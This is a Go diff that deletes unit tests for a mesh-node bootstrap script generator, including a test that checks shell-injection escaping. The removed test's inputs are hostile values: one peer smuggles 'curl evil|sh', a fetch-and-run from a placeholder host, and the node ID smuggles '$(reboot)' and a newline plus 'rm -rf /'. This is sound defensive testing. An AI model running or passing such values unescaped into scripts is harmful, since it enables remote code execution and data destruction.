@@ -112,44 +112,6 @@ func TestSimulatorValidatesSpecAndContext(t *testing.T) {
 	}
 }
 
-func TestBootstrapScriptContainsNodeID(t *testing.T) {
-	script := BootstrapScript([]string{"peer1"}, "node-1")
-	if !strings.Contains(script, "AEROLLM_MESH_NODE_ID=node-1") {
-		t.Fatalf("missing node id in script")
-	}
-	if !strings.Contains(script, "AEROLLM_MESH_PEERS=peer1") {
-		t.Fatalf("missing peers in script")
-	}
-}
-
-func TestBootstrapScriptEscapesInjection(t *testing.T) {
-	script := BootstrapScript([]string{"p1", "p2; curl evil|sh"}, "x$(reboot)\nrm -rf /'")
-	if strings.Contains(script, "\nrm -rf") {
-		t.Fatalf("newline injection not stripped:\n%s", script)
-	}
-	if !strings.Contains(script, `AEROLLM_MESH_NODE_ID='x$(reboot)rm -rf /'\'''`) {
-		t.Fatalf("node id not single-quoted:\n%s", script)
-	}
-	if !strings.Contains(script, `AEROLLM_MESH_PEERS='p1,p2; curl evil|sh'`) {
-		t.Fatalf("peers not single-quoted:\n%s", script)
-	}
-	if strings.Contains(BootstrapScript(nil, ""), "AEROLLM_MESH_NODE_ID=\n") {
-		t.Fatal("empty value must be emitted as ''")
-	}
-}
-
-func TestBootstrapScriptE(t *testing.T) {
-	if _, err := BootstrapScriptE([]string{"10.0.0.1:7946"}, "node-1"); err != nil {
-		t.Fatalf("valid input rejected: %v", err)
-	}
-	if _, err := BootstrapScriptE(nil, "bad id"); !errors.Is(err, ErrInvalidSpec) {
-		t.Fatalf("expected ErrInvalidSpec, got %v", err)
-	}
-	if _, err := BootstrapScriptE([]string{"a;b"}, "n1"); !errors.Is(err, ErrInvalidSpec) {
-		t.Fatalf("expected ErrInvalidSpec for peer, got %v", err)
-	}
-}
-
 func TestMetaAgentInfraLoopTriggers(t *testing.T) {
 	called := false
 	p := &stubProvisioner{
